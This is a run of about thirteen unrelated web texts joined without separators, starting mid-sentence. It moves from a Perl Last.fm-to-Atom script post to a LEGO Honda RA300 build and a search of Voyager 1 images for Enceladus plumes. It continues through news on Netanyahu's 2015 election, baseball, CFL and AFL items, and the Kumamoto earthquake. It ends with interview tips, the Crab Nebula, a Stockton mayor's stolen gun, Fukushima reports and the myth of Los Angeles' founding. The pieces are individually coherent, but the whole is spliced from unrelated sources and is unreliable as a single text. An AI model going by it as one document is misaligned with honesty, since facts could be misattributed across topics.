And CPAN has Net::LastFM which will make the API calls for me. Ok, so it hasn't been updated since 2009, but it still works (I've just noticed that there's also Net::LastFMAPI which is a little more recent).
So it just took a small amount of work to write a little program which grabs uses the Last.fm API to get some JSON that contains the information that I want and convert it to an Atom feed. In case this is useful to anyone else, I've put the code on Github. Please let me know if you do anything interesting with it.
And if anyone from Last.fm reads this. Please either turn the web feeds back on or remove the documentation that still claims they exist.

An iconic formula one from 1967 season, features drives, steering and suspensions with custom wheel and stickers.
Introduction
Honda is my favorite brand so far, I personally own a 91′ Civic EG6 and a 89′ 600 Transalp. I wanted for a while to recreate a Honda car. Adding to his that I wanted also to make a formula one but didn't figure out with the old generation of panel, here is my version of the Honda RA 300 from 1967 season with new generation design, including custom wheels and stickers. By making this car, I wanted to make honor to its fantastic motor and car brand.
Functionality
I have focused myself to design, in order to reproduce finely the bodywork of the car, that is why the functionality is quite simple, but they are :
Steering with a Servo-motor placed in the nose with steering wheel
Drives with double L-Motor place underneath the fake engine
Full suspension based on the original
The steering is operated by a servo-motor placed in the nose. The steering wheel is also connected to the steering use double 8 tooth gear (in order to reverse the clockwise) and 2 U-join to connect it to the steering wheel.
The drive is operated by a double L-motor located underneath the fake engine. there are connected together with gearing and are connected to the differential with 12/20 gears which pass underneath the axle. The fake engine is driven at the same speed has the electrical motor.
To finish with the suspension, there are the sames as original. With double wishbone on the front and the rear. First on the front, the shock absorbers are located in the nose with inverted position. In order that when the upper wishbone is pressed, the shock absorbers are pushed from the top, the wishbone are in fact articulated on the center.
Concerning the rear suspensions, it is based on the same design as the original. Basically with two wishbones with center hub. I have made many design for the hub, in order to reproduce finely the rear suspension. That is why I have use bend liftarm in dark bluish grey to reproduce the magnesium allow used in real car. It is also equipped with anti-roll bar.
The Design
This is the heart of this creation, I have focused many hours to give it properly proportions, shape and color, by choosing the correct parts and color. It starts with the nose, I have reproduced the global shape with plunging nose and refined at the end. The end shape of the nose which is red has required many work to the correct shape and layout of color. By using the bionicle tooth, I think I have succeeded to get the correct shape with shark shape.
Then the lateral bodywork are composed of curved panels. But I have also reproduced the evasive shape at the end. That is why the starts of the panel behind the front suspension are less wide than the end shape close to the fake engine. Thank to connector and rubber liftarm which allows deformations.
Then the back bodywork, the mechanical cathedral. Honda is well known for its motors, this car doesn't break with. That is why I have tried to make the most details I can, with using stud parts, detailed engine, and exhaust pipes. I have ordered for that many black tube and Tree plant parts to join them together and create the exhaust system. Then I have ordered some cones to make the fake gearbox at the end. I have tried to reproduce as possible as I can to shape and the original color. The engine is also decorated with 12 metallic silver air intake and a dark orange heat pad wing.
To finish I have reproduced the cockpit with the seat with simulated round extruder by using technique which consist to not lock each part together to keep a small gap. The cockpit is also equipped with a dashboard with 5 dials and windscreen using a curved shaped windscreen and lateral glass. Note that the fake gearbox lever is not connected to a gearbox but to the battery box in order to switch on/off.
To finish with the global finishing thing, I have painted the front wheel because it doesn't exist in this color. The rear wheels are only available in metallic silver color (and I also by the way expensive !), that is why I have painted the front wheels. And I have also made custom sticker, by using transparent self sticking sheep of paper which I have printed with the sticker (also made custom with editing software).
NEWS : JaapTechnic has developed custom pro-sheet of sticker for the honda, check my review here and the purchase page on its website here.
Conclusion
This creation is the most detailed I have made so far, including custom paint wheel and sticker, shape and color as the original, and detailed engine and bodywork. The playability is good with the 2 L-motor and it has a great impact for viewers regarding the shape, color and details.

Did Voyager 1 capture an image of Enceladus' plumes erupting?
From the moment I first found out about the discovery of geysers erupting into space by NASA's Cassini mission, I began to wonder whether they had been detected before. Pioneer data is of insufficient quality to detect them, but Voyager definitely could have. I carefully examined all of the images targeting Enceladus, but the illumination angle wasn't ideal (very high phase, or backlit, images are best for this, but none of the available images were taken at such an angle). I came up empty handed and dropped project.
Flash forward to the New Horizons Pluto encounters in the summer of 2015. I was sitting in a plenary meeting and the high phase images of Pluto's atmosphere were being discussed for the first time. Later in the meeting, someone asked a question about serendipitous images that might contain Pluto's small moons. The next talk was particle and fields stuff that I didn't really understand, so my mind wandered, and it clicked - maybe Enceladus made a serendipitous appearance in some high phase Saturn images.
In the fall of 2016, I finally found time to work on this. While Voyager 2 had the better camera, due to a spacecraft anomaly, it was not taking pictures during the first few days after closest approach, so after a check to see if there was anything from right after it was recovered, I moved on to Voyager 1. I experimented with some imagery from a few days out to get familiar with its cameras under these conditions before beginning in earnest. This image of Saturn came from this effort.
NASA / JPL-Caltech / Ted Stryk Saturn from the receding Voyager 1
As I searched through the dataset, a group of images stood out. They were taken on November 13, 1980, a day after closest approach. None of the Narrow Angle Camera images contained Enceladus, but eight of the Wide Angle Camera images did. They showed the small crescent and night time hemisphere illuminated in Saturnshine as only a few pixels across.
NASA / JPL-Caltech / Ted Stryk Cleaned raw image from the dataset used
I thoroughly calibrated, deconvolved, and stacked the images. After combining different subsets as well as the full set, I am confident in the detection of the plumes, just where they should be.

The right side is illuminated by the sun, the left by reflected light from Saturn, and the plume can be seen at the bottom.
In my excitement at having at last had some success with this project, I quickly wrote an Lunar and Planetary Science Conference abstract, which can be read here. It gives more detail about how this dataset was handled.
NASA / JPL-Caltech / Ted Stryk Erupting Enceladus over Saturn from Voyager 1 On November 13, 1980, Voyager 1 captured Enceladus and Saturn. These images, processed by Ted Stryk over 35 years later, captured Enceladus' plumes—long before their discovery by the Cassini spacecraft.

I plan to continue sifting through images to see if there are other datasets worth processing in that way. I plan to do similar work with other worlds as well. At the very least, this indicates Enceladus is indeed constantly erupting, extending the baseline back more than two decades.

JERUSALEM (Reuters) - Israeli Prime Minster Benjamin Netanyahu pledged on Wednesday to form a new governing coalition quickly after an upset election victory that was built on a shift to the right and drew an immediate rebuke from the White House.
In the final days of campaigning, Netanyahu abandoned a commitment to negotiate a Palestinian state - the basis of more than two decades of Middle East peacemaking - and promised to go on building settlements on occupied land. Such policies defy the core vision of a solution to the Israeli-Palestinian conflict embraced by President Barack Obama and his Republican and Democratic predecessors.
With nearly all votes counted, Netanyahu's Likud had won 29 or 30 seats in the 120-member Knesset, comfortably defeating the center-left Zionist Union opposition on 24 seats. A united list of Israeli Arab parties came third.
The result was a dramatic and unexpected victory for Netanyahu - the last opinion polls four days before the vote had shown Likud trailing the Zionist Union by four seats.
Although Netanyahu must still put together a coalition, his victory all but guarantees that Israel's president will give him the first opportunity to form a government, putting him course to become the longest-serving leader in the country's history.
"I am moved by the responsibility Israel has given me and I appreciate the decision by Israel's citizens to elect me and my friends, against all odds and in the face of powerful forces," Netanyahu said during a traditional thanksgiving visit to Judaism's holy Western Wall in Jerusalem.
But the promises he made to ultranationalist voters in the final days of the campaign could have wide consequences, including deepening rifts with the United States and Europe and potentially emboldening Palestinians to take unilateral steps toward statehood in the absence of any prospect of talks.
The White House scolded Netanyahu for abandoning his commitment to negotiate for a Palestinian state and for what it called "divisive" campaign rhetoric toward Israel's minority Arab voters.
Washington signaled that its deep disagreements with Netanyahu will persist on issues ranging from Middle East peacemaking to Iran nuclear diplomacy.
Saeb Erekat, chief Palestinian negotiator in peace talks that collapsed last year, lamented "the success of a campaign based on settlements, racism, apartheid and the denial of the fundamental rights of the Palestinian people".
Likud said Netanyahu intended to form a new government within weeks, with negotiations already under way with the far-right pro-settler Jewish Home party led by Naftali Bennett, the centrist Kulanu party and ultra-Orthodox groups.
The critical party to get on side will be Kulanu, led by former Likud member and communications minister Moshe Kahlon, who won 10 seats, making him a kingmaker given his ability to side with either Netanyahu or the center-left opposition.
"The citizens of Israel expect us to quickly put together a leadership that will work for them regarding security, economy and society as we committed to do - and we will do so," Netanyahu said.
Netanyahu's deputies were already holding preliminary talks with potential coalition partners, Israeli media said.
President Reuven Rivlin said he would launch consultations with party leaders on Sunday to try and form a new government as soon as possible.
Isaac Herzog, leader of the Zionist Union, conceded defeat and congratulated Netanyahu. Herzog said he would not seek to join a Netanyahu-led government.
The Tel Aviv stock market was largely unmoved by Netanyahu's victory, with the benchmark Tel Aviv 100 index up marginally at mid-day.
"The market's indifference to the results apparently stems from its belief that the coalition that will be formed will be more stable than its predecessor," said Idan Azoulay, chief investment officer at the Epsilon brokerage.
HARD ROAD AHEAD
While Likud is the largest party, the process of forming a coalition could be challenging, with potential political partners certain to raise a variety of demands.
With the backing of right-wing and religious factions, and with Kahlon also on board, Netanyahu could end up with 67 parliamentary seats, a commanding majority.
If Netanyahu follows through on his pledges it would put him on a collision course with the Obama administration and the European Union, which has been weighing steps including trade measures to sanction Israel for its settlements policy.
GLENDALE, Ariz. -- As far as early spring workouts go, Field 1 at Los Angeles Dodgers camp Monday was must-see baseball.
New Dodgers right-hander Kenta Maeda faced hitters for the first time, and after just two pitches his outing had generated enough attention for somebody to stop the progressive rock that had been blaring from a backstop speaker all morning.

Maeda played some resonating notes of his own, facing eight batters over two simulated innings. The veteran of eight seasons in Japan threw 38 pitches, as well as two pitchouts, and afterward considered it no big deal. He even downplayed his scheduled Cactus League start Saturday at home against the Arizona Diamondbacks.
"It's still spring training," Maeda said through an interpreter. "What is more important is how I do in the regular season."
Catcher Yasmani Grandal offered more of a review, even comparing the new Dodgers right-hander to their old one. Yes, Grandal dared to bring up Zack Greinke when talking about Maeda.
"Here's a guy [Maeda] that throws four pitches," Grandal said. "We had Greinke last year who could throw four pitches, so we did as good as we could to put together a game plan together and execute it."
The Greinke mention raised eyebrows, with Grandal clarifying his statement just a bit.
"The reason why I said Greinke is that he was the only guy we had last year who had a four-pitch mix," Grandal said. "That's why there was the comparison, not that they have the same stuff. They are obviously two different pitchers. But as far as getting creative and doing what we want to do, there is some comparison there."
Maeda showed a fastball, changeup, slider and curve as he faced Chase Utley, Charlie Culberson, Adrian Gonzalez and Yasiel Puig in his first inning of work. He faced Andre Ethier, Carl Crawford, Howie Kendrick and Shawn Zarraga in his second inning. No ball was hit particularly hard, with Puig hitting a lazy fly ball near the warning track in center on the first pitch he saw.
What the 27-year-old did best was change speeds and stay low in the strike zone, for the most part, throwing his elevated pitches by design.
"The pitches that were elevated were the ones that I threw hard, so I don't think it's necessarily a bad pitch," he said.
Special assistant Greg Maddux even offered words of encouragement after the outing.
"No advice, but he told me I threw well today," Maeda said of Maddux.
It might have been just 38 pitches, but it was enough to have Grandal thinking about a strategy for future starts.
"I want to say he can get it up to 94-95 [mph] when he wants to," Grandal said. "Down in the zone he sticks to 92, which is fine with me. With him it will be rocking batters back and forth: slow, fast, slow, fast. He can do it inside or outside, so it will be fun."
The team nominees for the CFL's outstanding player awards, selected by voting members of the Football Reporters of Canada and CFL head coaches, were announced on Wednesday.
And the Saskatchewan Roughriders' most colourful but controversial player is the choice for the team's most outstanding player.
Receiver-cornerback Duron Carter leads the Roughriders with 1,040 reception yards and eight touchdowns.
One of those majors was on an interception return.
But the son of pro football Hall of Fame receiver Cris Carter has caused some distractions for the organization this year, such as reports of a fight during practice last month.
Carter was reportedly sick after practice on Wednesday so he was unavailable to the media.
Head coach Chris Jones has suggested in the past it's a challenge to keep Carter mentally in-check, and that he has daily meetings with Carter to make sure they're on the same page.
"I think it's good for both of us, so we have clarity on each other's expectations. Certainly he knows ours as a team. I think that's important," said Jones after practice Wednesday.
Riders' head coach Chris Jones is not a fan of individual awards. 'Twenty years from now they would rather come back and be honoured for winning a Grey Cup,' he said. (Glenn Reid/CBC)
Brendon LaBatte was the unanimous choice for the Riders' most outstanding offensive lineman.
While surprised he was a unanimous pick, LaBatte — who played left guard and centre in 2017 — says it beats last year, when he sat out most of the season with a neck injury.
"Way better than the alternative of sitting on the bench for the last 15 weeks and just watching the other guys. So it just feels good to get back out there and be able to play at a level that gets you recognized for this sort of stuff." said LaBatte.
Ed Gainey will be the Roughriders' representative on defence, voted the team's top defencive player.
Gainey has 10 interceptions so far this season — one shy of a team record with one game to go.
His personal goal for the season was 12.
"I didn't get a chance to get a shot down south [in the NFL] so I told myself I was going to come up here in the CFL and make a name for myself. It took six years for me to do it but it feels good."
Ed Gainey is the Roughriders' nominee for top defensive player. He has 10 interceptions so far this year, including four in one game. (THE CANADIAN PRESS)
Henoc Muamba (most outstanding Canadian player), Christion Jones (outstanding special teams player) and Toby Antigha (outstanding rookie) round out the rest of the Riders' nominations, who will now challenge for the division awards.
The East and West Division winners for CFL Awards will be announced on Nov. 9.
Muamba says it's the top team award they're interested in.
"Coach Jones mentioned this to the entire team when he announced the nominations — that ring feels a lot better than any type of individual success, so I'm excited about that," said Muamba.
Which road the Riders take toward the Grey Cup will be determined this Saturday, when they host the Eskimos in the final regular season game.
A Riders victory will mean they stay in the West Division. A loss will send them east.
Rory Sloane is one of five Crows to make Champion Data's mid-season best 22
IF YOU were to select this year's best 22 players purely on stats, five Adelaide players would make the cut at the mid-point of the 2017 season.
A quintet of Crows – Rory Sloane, Rory Laird, Eddie Betts, Jake Lever and Rory Atkins – have made a mid-season All Australian team compiled by Champion Data, based on the players who top the Schick AFL Player Ratings along with some structural requirements.
Spots in the side were categorised as: tall forwards, general forwards, tall defenders, general defenders, midfielders, wingmen and a ruck. An individual had to play at least 40 per cent of their football in a position to be considered there, with eight games being the qualification.
The top two key forwards and defenders were selected. From there, the next four best forwards and backmen were picked, although only one more tall in each section of the ground could be used.
At least one non-midfielder had to be on the bench.
Superstar pair Patrick Dangerfield and Dustin Martin are the two highest-ranked players this season respectively, so would be the captain and vice-captain if performance was the only measure.
Those unlucky to miss were Trent Cotchin, Marcus Bontempelli and Nathan Jones, who were the next three in line to make the side.
For the Crows, Sloane, Laird and Betts were obvious inclusions. Out-of-contract defender Lever was named at centre half-back, while Atkins nabbed a spot on the wing.
Lever was ranked No. 1 in the competition for intercept possessions (10 per game) and intercept marks (four) going into round 12.
Atkins has more pressure acts than any other wingman in the AFL, and is No. 2 in metres gained for players in that position.
Opposite him is Gold Coast's Aaron Hall, who has been the AFL's fourth-most efficient tackler.
Melbourne young gun Christian Petracca was recognised with a spot on the bench.
In his third year as at the elite level, Petracca has lit up the competition. Of general forwards, he is first for contested possessions, equal-first for inside-50s and second for score assists, behind Port Adelaide's Robbie Gray.

Japan earthquake: Aftershocks rattle country's south-west after nine dice, hundreds injured in tremor
Posted
Aftershocks have rattled south-western Japan after a strong earthquake killed nine people, injured at least 1,000 and cut power and water across the region.
Key points: More than 130 aftershocks in south-western Japan following quake
Thousands of households without electricity and water
Factories suspended operations
By Friday afternoon, more than 130 aftershocks had hit the area around the city of Kumamoto in the wake of the magnitude-6.5 earthquake the night before.
Officials said the frequency was tapering off but the risk of further strong aftershocks will remain for about a week.
Although the magnitude of the earthquake was much lower than the magnitude-9 quake on March 11, 2011 — which touched off a tsunami and nuclear meltdowns at Fukushima — the intensity was similar because it struck on land and at a much shallower depth.
"We managed to huddle into a space, that's why we were saved," one man told Japanese broadcaster NHK after he and his family were rescued from their collapsed house two hours after the quake hit.
"We're all safe, that's what counts."
More than 44,000 people initially fled to schools and community centres, some spending the night outside after the earthquake hit.
Roads cracked, houses crumbled, and tiles cascaded from the roof of the 400-year-old Kumamoto Castle in the city's centre.
Among those pulled from the wreckage was an eight-month-old baby girl, wrapped in a blanket and passed hand to hand by firefighters.
Hospitals evacuated, factories suspended
Hospitals had to evacuate patients and several companies, including Honda Motor Corp, Sony Corp and tire maker Bridgestone Corp suspended operations at factories in the area.
More than 3,000 troops, police and firemen were dispatched to the area from around Japan, and Prime Minister Shinzo Abe said more would be sent if needed.
"We will do everything in our power to ensure the safety of local residents," Mr Abe told a parliamentary committee.
Most of the dead came from Mashiki, a town of around 34,000 people near the epicentre of the quake, where firefighters battled a blaze late on Thursday.
Daylight showed splintered houses under tiled roofs and an apartment building with a pulverised floor, where two people died.
"I want to go home, but we couldn't do anything there," one boy at an evacuation centre told TBS television as he bounced a baby in his arms.
Trains derailed, highways closed
Service on the Shinkansen superfast train in Kyushu was halted after one train derailed, and highways were closed after some sections collapsed.
About 12,200 households were without electricity on Friday afternoon, according to Kyushu Electric Power Co Inc, while around 58,000 lacked water.
The Nuclear Regulation Authority said there were no irregularities at three nuclear plants on the southern major island of Kyushu and nearby Shikoku.
The 2011 quake temporarily crippled part of Japan's auto supply chain, but some companies have since adjusted the industry's "Just in Time" production philosophy in a bid to limit any repeat of the costly disruption.
Though the intensity of Thursday's quake on the Japanese scale matched that of the March 2011 quake, which left nearly 20,000 dead, the absence of a tsunami helped keep the death toll down.

Jobs are not easy to find. In this time of recession, jobs become even more scarce. Companies nowadays are really putting emphasis in hiring the best candidate, more on quality rather than quality. Have you experienced applying in a job for a Call Center, a Bank, or a private company? Passing the initial screening and the exams only to flunk during the final interview? Frustrating, isn't it? It leaves a feeling in your gut that's a mix of dissapointment and pure self loathing. Fret not, this hub is for you guys. Using my experience as an interviewer, I will try to give you tricks and tips to help you overcome that hump which is the final interview in this second part of several hubs which I will be creating on getting a job.
The final interview is usually composed of questions aimed to provide the interviewers and the hiring staff with information which will be able to help them with the hiring decision. Questions can range from your experiences in school to your job experiences. One thing that you can notice is that the questions are behavioral, which means that they are targeting a specific behavior from you, the interviewee. Below are some tips to help you out in the preparation for the interview as well as the interview proper itself:
Prepararation is Key - Just like any other recruitment step, the final interview is very important and review and preparation is always vital to your success or failure. Research about the company that you are applying for. It is always important to know the background and brief history of the company so that you will get a feel of what kind of people they are looking to hire. Also, some interviewers ask the applicants what they know about the company and why they would like to apply. Knowing about the background will create the impression that you are taking the job seriously and that you care.
Honesty Still the Best Policy - One thing that I have noticed is that applicants tend to lie about their answers during the final interview. This is not a smart move as sooner or later, the company you are applying for will know about this and it will jeopardize your application or job status. Fraud is never the answer, to pass the final interview you need to answer honestly not give the interviewers what you think they want you to say.
Specify and Clarify - As mentioned above, the questions during the final interview are behavioral, thus specific behaviors are targeted. The important thing is always to specify your answers, and not give a broad and safe response. It is always smart to give specific details as these are the information being evaluated by the interviewer to make a decision to pass or fail you.
Stay Relevant - Always try to stick to the topic or the question. Don't stray away from the discussion or the interview questions and move to irrelevant and unrelated answers. Stay within the realm of the subject matter, it is okay to move to another situation or answer related to the question to give a detailed answer, as long as you do not veer to far from the initial question.
These are all for the information I have for now. Please come back as I will finish the list of tricks and tips in my next hub. If you have any questions or comments, please leave them below so that I may address them as soon as I can. I hope that these tips will help you land your dream job and wishing all you job seekers all the luck in your search for a place in the corporate world.
Nearly a thousand years ago, a new star suddenly appeared in the constellation Taurus, the bull. It was so bright that, for weeks, it was visible even during the daytime.
Today, we know that this astronomical oddity was a supernova—the colossal explosion of a dying star some 6,500 light-years away. Although the mysterious star faded from Earth's night sky several years after it appeared, its remnants formed one of the most spectacular objects in our galaxy: the Crab Nebula.
The expanding cloud of energized gas resembles a tapestry woven from brightly colored filaments. And now, for the first time, the Hubble Space Telescope has peered into the very heart of this celestial storm.
The extraordinary view—a combination of three high-resolution images—reveals the spinning core of the long-deceased star, which continues to breathe life into the gas that surrounds it.
The core is an exotic object known as a neutron star. Made entirely of subatomic particles, it has nearly the same mass as our sun but is packed into a dense sphere less than 20 miles (32 kilometers) across.
The Crab Nebula's neutron star is spinning at approximately 30 rotations per second, whipping up the material around it.
“The rapid motion of the material nearest to the star is revealed by the subtle rainbow of colors in this time-lapse image, the rainbow effect being due to the movement of material over the time between one image and another,” according to a Hubble press release.
A powerful magnetic field that surrounds the neutron star is made visible by a ghostly blue shell of energized gas, which glows with radiation emitted by electrons swirling within the field at nearly the speed of light.

STOCKTON -- A gun stolen from Stockton Mayor Anthony Silva's home was linked to several crimes, including the killing of a 13-year-old, according to the District Attorney's office.
The Beretta pistol, which is in the Stockton Police Department's possession as evidence, was used in the Feb. 15, 2015 in a drive-by shooting which killed 13-year-old Rayshawn Harris. According to officials, Harris was standing in front of his home on South Sacramento Street around 7 a.m. when he was fatally shot.
There were no suspects identified in the shooting, but the investigation showed the shell casings were ejected from the stolen weapon. A witness described the shooter as an African American man wearing a grey sweater and white shoes.
The weapon, a .40 caliber Beretta Px4 Storm semi-automatic pistol which was reported stolen from Silva's house two months after the shooting, was also used in two other criminal investigations.
Silva responded to FOX40 via text message Friday evening saying he's heartbroken over the news.
"I feel terrible and I feel sick to my stomach. Obviously this was my worst possible fear. I will be in shock for a long time. It's a horrible tragedy that will be on my mind and in my prayers forever. I will reach out to the family and do whatever I can. I have not been provided any details yet, so I only can react to what the news is claiming. Everyone please pray for Stockton."
Silva, who later spoke with FOX40 as he was leaving to take 100 kids to his annual summer camp, said he was using his Morada home that was burglarized for storage and reported the burglary in March 2015.
"The neighborhood watch called me and said people are breaking into your hose there. I caught them at the robbery in progress and they slammed into the front of my car," Silva recalled, acknowledging that there might have been other break-ins that weren't noticed before that day.
He also had a 9mm pistol stolen from his current Spanos Park home during his 2015 Sister Cities trip to the Philippines. When presented with fact that few people have one gun stolen from one home, let alone two from two different homes, his response was, "I know."
After Rayshawn was killed Silva was criticized for the lack of the security in the city, but relatives defended the mayor on Facebook.
Once hearing the mayor's stolen gun was responsible for their loss, family members did not want to speak on camera Friday night, saying, only by phone, that they're shocked.
Silva says he shares their outrage and sadness and wonders why his name was released when the names of other owners of stolen guns involved in crime aren't.
But he didn't want to comment on his theories just yet.
"For now, it's just a time to say I'm sorry to the family, I'm praying for the victim and praying for Stockton that we can end the violence," Silva said.
Silva's stolen Beretta was also used Jan. 15, 2015 in a drive-by shooting at a home on East Church Street. The two residents in the home were not injured. Officials said eight .40 caliber and six 9 mm casings, which were fired by the stolen pistol, were recovered at the scene.
According to the DA's records, the weapon was recovered June 9, 2016 after Stockton Police responded to a domestic violence call on Treetop Drive.
Officials are still investigating the cases, and encourage anyone with information call the Stockton Police Department at (209)937-8377.
Nuclear crisis at Fukushima continues to unfold: a trilogy of reports by PBS NewsHour's Miles O'Brien (video)
Miles O'Brien, science correspondent for PBS NewsHour, has produced a series of three must-see investigative reports revisiting the Fukushima nuclear crisis in Japan. His stories explore how the radiation leaks triggered by the earthquake and tsunami are continuing to affect life there, and beyond.
First, above, "Fukushima nuclear crisis continues to unfold."
The site of the Fukushima nuclear disaster in Japan remains a post-apocalyptic landscape of abandoned towns, frozen in time. Science correspondent Miles O'Brien got a rare tour inside the plant, where three nuclear reactors melted down after the earthquake and tsunami in 2011, to learn more about the long-term solutions for stemming the radioactive contamination.
Next, "Fishing for data in the radioactive waters off Fukushima."
With help from fisherman and citizen scientists, researchers in Japan and the U.S. are tracking the nucleotides in the ocean creatures who swim in the plume of water tainted with radiation from Fukushima. Their research is part of a long-term effort to figure out when — if ever — certain fish will be safe to eat.
And finally, "Japan considers energy future after Fukushima."
A disaster at the Fukushima Daiichi nuclear power plant on March 11, 2011, has greatly affected how Japanese citizens feel about that energy source. Polls suggest that 80 percent of voters now oppose nuclear power in Japan. But walking away from nuclear power is a tricky proposition for a country that has not invested much in renewable alternatives.
These stories were among the last he reported and shot before an accident on assignment in the Philippines led to the loss of his left arm. He is recovering well. Among the risks of solo backpack journalism: what he suffered.
(Disclosure: Miles is my partner, and I love him very much and am very proud of this important work.)
September 4 marks the traditional anniversary of the 1781 founding of El Pueblo de la Reina de Los Angeles (The Town of the Queen of the Angels).
In a scene that's reenacted each year by descendants of the pueblo's original colonists, the 44 founding pobladores (townspeople) marched on Sept. 4, 1781, as a group from Mission San Gabriel Arcángel to the historic Los Angeles Plaza at the southern end of Olvera Street. There, Governor Felipe de Neve welcomed the procession and presided over a lavish ceremony commemorating the town's founding. It was a celebration worthy of the birth of a great city.
Like the story of Romulus and Remus, the traditional narrative of L.A.'s founding has proven to be more myth than fact.
Except that none of it actually happened.
In recent decades, scholars have turned to journals, correspondence, maps, official records, and other carefully preserved eighteenth-century documents to piece together the actual story of the agricultural settlement's founding. And, like Romulus and Remus, the traditional narrative has proven to be more myth than fact: the original pobladores arrived separately at Mission San Gabriel Arcángel, some settled the townsite as early as June 1781, and September 4 was likely an arbitrary date that Neve used in his report to his superiors – one that was marked with little pomp and circumstance.

The story of Los Angeles' founding begins with a Russian expedition to North America in the 1730s and 1740s. Although Spain had laid claim to the coast of upper California for nearly two centuries, it had never settled the land, which lay along the northwestern reaches of its vast American empire. But when a Russian expedition, led by the Danish explorer Vitus Bering, reached Alaska in 1741, it became clear that the Russian empire, expanding eastward over the Eurasian landmass and across the soon-to-be-named Bering Strait, might harbor territorial ambitions toward Spanish California.
In the mid-1760s, the visitador general of New Spain, José de Gálvez, drew plans for the colonization of California. Settlement would take three forms: a string of religious missions to convert the indigenous peoples into Spanish subjects, presidios to secure Spain's military hold on the province, and pueblos to supply the garrisons with food and establish a secular, civilian presence in the territory. Seeing more signals that Russia intended to expand south from Alaska into California, King Charles III of Spain hastily approved the plans in 1768.
A presidio in San Diego came first in 1769, followed soon by missions strung up the California coast. In Southern California, Mission San Gabriel Arcángel appeared in 1771.
Civilian settlement, however, lagged. It was not until 1777 that Governor Felipe de Neve founded the first pueblo in San Jose.
Eight years earlier, Gaspar de Portolà's expedition had passed through the Los Angeles basin on its way north and noted what would become the future site of upper California's second pueblo, Los Angeles. The broad river valley, framed by a line of irregular hills, had "all the requisites for a large settlement." The missionary Juan Crespí described the scene in his diary entry of Wednesday, Aug. 2, 1769:
We set out from the [San Gabriel] valley in the morning and followed the same plain in a westerly direction. After traveling about a league and a half through a pass between low hills, we entered a very spacious valley [the Los Angeles basin], well grown with cottonwoods and alders, among which ran a beautiful river from the north-northwest...We halted not very far away from the river, which we named the Porciúncula [today, the Los Angeles River]...The plain where the river runs is very extensive. It has good land for planting all kinds of grain and seeds, and the most suitable site for a mission.
Fittingly, the first European party to set foot on the future site of Los Angeles felt three earthquakes on the day of its arrival.

Portolà and Crespí were not the first to realize the site's suitability for settlement; that same day, the expedition encountered the native Tongva (Gabrielino) people, who came from their riverside home to greet and trade with the Spaniards. Their village, named Yang-na (or Yaanga, according to some sources) was one of the largest indigenous settlements on the Los Angeles plain. A giant, 400-year-old sycamore at the center of the hamlet, which Spanish-speakers later named El Aliso, provided shade to the tribal leaders who (according to some accounts) met under its canopy.
Finally, in 1779, Neve secured approval for the founding of a new pueblo at the site mentioned by Crespí. Neve personally oversaw much of the town planning, mandating a site close enough to the Porciúncula River for irrigation but elevated enough to survive the inevitable floods.
The pueblo's layout – based on the standard Spanish colonial model replicated everywhere from South America to New Mexico – would feature a central plaza surrounded by residences and, eventually, a village church. The Spanish soldier José Darío Argüello detailed Neve's plan in a 1786 map, preserved today at the University of California, Berkeley's Bancroft Library. The plaza and residences were to be built on a terrace abutting the Elysian Park Hills, creating a defensible military position. Farmland was to be situated closer to the river – on the west bank, the pobladores' lots, and on the east, the royal fields, which later became Boyle Heights.

Neve dispatched his lieutenant governor south to New Spain's Interior Provinces (present-day Mexico) to recruit the first pobladores. Aware of the long, dry summers of Southern California, officials recruited experienced farmers from the dry province of Sonora, where irrigation made agriculture possible, as well as skilled artisans who would keep the settlement supplied with farming tools. Neve and his lieutenant governor also searched for soldiers prepared to serve on the frontier and escort the pobladores over hundreds of miles to their new home.
On Feb. 2, 1781, 12 settler families, escorted by 17 soldiers and their families, departed the Sonoran town of Álamos. A second party made up of soldiers and nearly 1,000 head of livestock would later follow Juan Batista de Anza's overland trail to Alta California, but the pobladores' path took them across the Gulf of California and then up the Baja California peninsula to their destination.
The town's first settlers were a remarkably diverse group. The pobladores who left Álamos were all Spanish subjects, but only two of the men among them claimed exclusive Spanish descent, as historian Antonio Rios-Bustamante notes in his 1992 book, Mexican Los Ángeles: A Narrative and Pictorial History:
The 23 adults and 21 children in this group were a representative cross-section of the laboring class majority population of the northwestern Mexican frontier provinces in the eighteenth century...the group reflected the ethnic composition of Sonora and Sinaloa from which most came. Eight of the twenty-three adults were Indians, ten were of African descent...Records also show that one of the black settlers, Luis Quinero, was the son of a black slave and an Indian woman of Álamos.
At this point in the story, the traditional narrative begins to depart from what historians today accept as historical fact. It was long thought that the pobladores arrived as a single group at Mission San Gabriel Arcángel. However, correspondence and other records show that the settlers actually arrived as separate parties over the course of a few months.
More central to L.A.'s foundation myth is the idea that the pobladores all walked from the mission to the townsite together. This notion, too, is now thought to be wrong.
Historian Harry Kelsey's 1976 article for the California Historical Quarterly, "A New Look at the Founding of Old Los Angeles," has been particularly influential in understanding the town's creation. Consulting the journal – today preserved in the Huntington Library – of Franciscan missionary Francisco Palou, Kelsey established that the first four families of pobladores arrived at the San Gabriel Mission in June and were quickly dispatched to the Los Angeles townsite nine miles away. Palou wrote:
There arrived first at San Gabriel the people who came by way of Old California, and soon as part of them arrived [Neve] gave them the order to found the projected town of Nuestro Senora de Los Angeles with some four families...The rest of the troop was kept at San Gabriel Mission until the group arrived that came by way of the Colorado River.
A later entry described the new town:
Town of Our Lady of the Angels: About three leagues directly northwest [of San Gabriel] on the banks of the River named Porciuncula a town is started that had its beginning about June of 81. In it are established four families of people of reason and four soldiers of escort.
Eventually, by September, the pueblo's 11 founding families had settled their land on the banks of the Los Angeles River. But if the first pobladores arrived in June, why is September 4 celebrated as the city's birthday?
William David Estrada, curator of California and American history at the Natural History Museum of Los Angeles County, provides a succinct explanation in his 2008 book, "The Los Angeles Plaza: Sacred and Contested Space":
...[O]n November 19, Neve informed Croix [his superior] that the founding of the pueblo had taken place under his command on Sept. 4, 1781. The selection of this date possibly was arbitrary, since September marked the month when the colony's financial records were first recorded. Therefore, September 4 marked the official, if not the actual, date of the founding of El Pueblo de La Reina de Los Angeles. Contrary to another long-cherished myth, it took place without pomp or ceremony.
One final incongruity between the traditional account and historical fact is noteworthy. Although the Los Angeles Plaza Historic District is where L.A.'s earliest history is remembered today, the monument does not mark the original site of the pueblo. Historians are unsure where the settlers first built their adobes, but the heart of the pueblo evidently moved at least once and perhaps twice – apparently to escape the occasional yet devastating floods of the Los Angeles River. The town square shifted to its present location in 1818, the year construction began on La Nueva Iglesia de Nuestra Señora Reina de Los Angeles. Today, thousands of tourists stroll past the church and down Olvera Street's alley of shops and restaurants each year. The location of the original pueblo, the plaza vieja, is lost to history.

